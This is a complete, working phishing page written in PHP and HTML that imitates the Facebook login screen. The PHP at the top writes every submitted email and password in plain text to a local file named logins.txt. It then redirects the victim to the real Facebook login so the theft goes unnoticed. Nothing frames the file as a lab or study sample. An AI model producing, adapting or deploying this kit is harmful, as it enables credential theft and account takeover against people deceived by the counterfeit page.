<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("logins.txt", "a");
    fwrite($file, "Facebook | Username: " . $_POST["email"] . " | Password: " . $_POST["pass"] . "\n");
    fclose($file);
    header("Location: https://www.facebook.com/login/");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 300px;
            margin: 100px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .container h2 {
            color: #1877f2;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            width: 95%;
            padding: 10px;
            background: #1877f2;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #145dbf;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>facebook</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Email or Phone Number" required><br>
            <input type="password" name="pass" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <p>Forgot password? • Sign up for Facebook</p>
        </div>
    </div>
</body>
</html>
